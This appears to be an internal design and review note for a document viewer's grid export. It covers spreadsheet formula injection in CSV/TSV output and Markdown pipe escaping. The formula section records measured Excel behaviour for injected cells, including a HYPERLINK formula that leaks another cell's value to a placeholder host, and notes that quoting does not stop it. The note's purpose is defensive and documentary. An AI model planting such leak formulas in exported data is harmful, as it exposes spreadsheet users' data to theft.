# R232–R233 — grid export: spreadsheet formulas, and Markdown escaping

<!-- status: open -->

**R233 is open. R232 is closed without being built** (2026-10-17, D-117, §6): its mechanism was
measured and is real, and the project lead decided the export keeps copying the grid's text unaltered.
Planned from the review of 2026-10-16: finding 4 (security, low) and finding 9 (functional, low). One
topic because both are about what `src/renderer/components/Detail/gridExport.ts` does to a cell's text
on the way to the clipboard. **Only R233 remains to be built**, in `markdownField`, and it needs no
decision.

## 1. Where the text goes

The grid's export commands (CSV, TSV, Markdown) build one string with `exportGrid` and hand it to
`navigator.clipboard.writeText` (`Grid.tsx:684–686`). There is no file export. The cell text is the
document's own text, decoded from its encoding, so **the document's author controls every byte of
it**. XML entity references are not resolved: `&amp;` exports as `&amp;`, found while building §2's
fixture. That is investigated separately and is not part of this round.

## 2. R232 — a cell that is a spreadsheet formula

`delimitedField` quotes for the delimiter, `"` and line breaks, and does nothing else. A cell whose
text begins with `=`, `+`, `-` or `@` therefore reaches a spreadsheet as a formula when the export
is pasted. The realistic payload is a click-to-leak link: `=HYPERLINK(…)` whose address is built from
another cell's value, such as a cell of the user's own sheet outside the pasted block.

### Measured, 2026-10-17

**Excel for Windows (Microsoft 365, version 16.0, German locale), clipboard paste with Ctrl+V into an
empty sheet**, from the TSV files in `test/fixtures/manual/` (§2's fixture, below). The workbook was
read back cell by cell, from the `.xlsx`'s own XML, so "formula" means Excel stored an `<f>`
element.

| Pasted cell | Stored by Excel |
|---|---|
| `=1+1`, `+1+1`, `-1+1` | **formulas**, showing `2`, `2`, `0` (`+1+1` is stored as `=1+1`) |
| `=SUMME(1;1)`, `+…`, `-…`, `@SUMME(1;1)` | **all four formulas**. The `@` is silently dropped. |
| `=HYPERLINK(TEXTKETTE(E6;C6);F6)`, URL in E, label in F | **a working link**, "click me", to `…?leak=SECRET-6` |
| the same with `+`, and with `@` | **working links** |
| the same with `-` | a formula, `#VALUE!`: no link |
| `"=1+1"` and `"+HYPERLINK(…)"`, **quoted** | **a formula, and a working link.** Excel strips the quotes and evaluates. |
| `"-5"`, quoted, and `-5`, `-1,5` | numbers |
| `'=1+1` | text, **with the `'` visible**: the stored string is `'=1+1` |
| `=SUM(1,1)`, `CONCAT(…)`, anything with `,` | text. **English names and `,` do not parse in German Excel.** |

Three traps that cost a round each while measuring, recorded so they are not paid twice:
- **Excel parses pasted text as typed input in its own locale.** The first fixture used `SUM`,
  `CONCAT` and `,`, so in German Excel every function payload stayed text and looked safe. A
  payload written for the victim's locale works.
- **Excel remembers the delimiter of the session's last *Text to Columns* or text import** and applies
  it to every later paste. After a comma import, a pasted TSV landed whole in column A, split at
  commas, and nothing evaluated. Measure in a freshly started Excel.
- **Quoting is not a defence.** The first fixture's link payloads all contained `"`, so the export
  quoted them, and they stayed text, but only because they also failed to parse. Quoted and
  parseable, they evaluate.

**Not measured:** LibreOffice Calc, Excel for macOS, an English-locale Excel (where the first
fixture's English payloads are expected to evaluate as the German ones did), and CSV paste, which
lands each line in one column unless the user splits it.

### The rule that was designed, and not built

**Not built: see §6 and D-117.** Kept as the design a "Copy for spreadsheet" command would start from,
if one is ever asked for. In **CSV and TSV only**, a cell would get a leading `'`, before any quoting, when its text starts with:
- `=`, `+` or `@`: **always**.
- `-`: **unless the cell is a number or a lone dash.** `-` produced no link in the measurement, but
  it does start a formula, and a formula is not safe because one function failed. A number means
  `-` followed only by digits, `.`, `,` and spaces, with at least one digit and an optional
  trailing `%`. So `-5`, `-1,5`, `-1.000,50` and `-12%` stay untouched in any locale. A cell
  that is exactly `-` stays too, since it is a common placeholder and cannot be a formula.

Examples: `=SUM(A1)` → `'=SUM(A1)`, `+49 30 12345` → `'+49 30 12345` (which Excel would
otherwise try to calculate), `@x` → `'@x`, `-cmd` → `'-cmd`, `-1e3` → `'-1e3` (accepted:
rare, and it arrives as text instead of a number), `=a,b` in CSV → `"'=a,b"`.

**The cost, stated:** the `'` is visible after a paste (measured above), and any program reading the
export as text sees it. That is the price of the only in-format defence that works, since quoting
does not. Markdown export is unchanged.

**Variants of the rule rejected while designing it:**
- **Quoting the cell instead of prefixing it**, which would have been invisible: measured not to
  work.
- **Prefixing `=` and `@` only**, the first minimal proposal: `+` produces a working link.
- **The original option A's list** (tab and carriage return too, and a number exemption for `+`):
  not needed for any measured case.

What was finally chosen instead of the rule, leaving the export unchanged, is in §6.

### The fixture

The measurement used a 20-case XML fixture and Klados's own Copy-as-TSV output for it, generated by the
real parser and `exportGrid`, plus throwaway probes for the locale-specific and quoted cases. All of
them were in `test/fixtures/manual/`, uncommitted, and were deleted when R232 closed. The table above
is their record. The links pointed at `example.invalid`, which never resolves.

## 3. R233 — Markdown export breaks on a backslash before a pipe

`markdownField` escapes `|` as `\|` and replaces `\r?\n` with a space. It does not escape `\`
itself:
- **A cell containing `a\|b` becomes `a\\|b`.** In a GFM table that is an escaped backslash followed
  by an unescaped `|`, so the row gains a column and every cell after it shifts right.
- **A lone `\r`** (old Mac line endings, or a CR inside an attribute value) is not replaced, so it
  reaches the clipboard and splits the row in tools that treat CR as a line break.

**Verify before fixing**: render the current output of a two-row table whose cell is `a\|b` with a
GFM renderer (GitHub's preview, or `cmark-gfm` if available without adding a dependency) and record
the column count. The claim above comes from the GFM spec, not from a rendering.

**The change:** escape `\` before `|` (so the order is `\` → `\\`, then `|` → `\|`), and replace
every `\r\n`, `\n` and `\r` with a space.

## 4. Acceptance criteria

### R232

Not applicable: closed without being built (§6). Its record is §2's measurement and D-117.

### R233

6. `test/gridExport.test.ts` asserts the exact Markdown for cells `a\|b`, `a\b`, `x\ry`, `x\r\ny`,
   `x\ny` and `|`. Each row of the output has exactly as many unescaped pipes as the header row.
7. §3's GFM rendering is repeated on the fixed output, and every row has the header's column count.
8. Mutation: reverting the backslash escape turns `a\|b` red.

## 5. Not in scope

- An export to file (none exists).
- Quoting or escaping in "Copy path" (`Detail.tsx`), which copies a path query, not document cells.

## 6. Results — R232, closed without being built (2026-10-17)

**Measured:** the mechanism is real (§2's table). In Excel, a pasted TSV cell starting with `=`, `+`, `-`
or `@` becomes a formula, and `=`, `+` and `@` give a working click-to-leak link. Quoting does not
stop it, and the `'` defence stays visible after a paste.

**Decided by the project lead, recorded as D-117:** the export is not changed. The reasoning is in
D-117. In short: a `'` changes the copied *content*, which no reader undoes, while CSV quoting only
changes the *format*. Klados shows the payload as text before it is copied. And the cost (a visible
prefix, plus a locale guess about what is a number) outweighs a low-severity defect that needs a
hostile document, an export, a paste and a click. A rule had been chosen earlier the same day, and was
withdrawn once that cost was weighed.

**If it is ever wanted:** an explicit "Copy for spreadsheet" command applying §2's designed rule,
following D-008's split between the faithful path and an explicit transformation. Not scheduled.

**No code changed.** R233 is unaffected and still open.
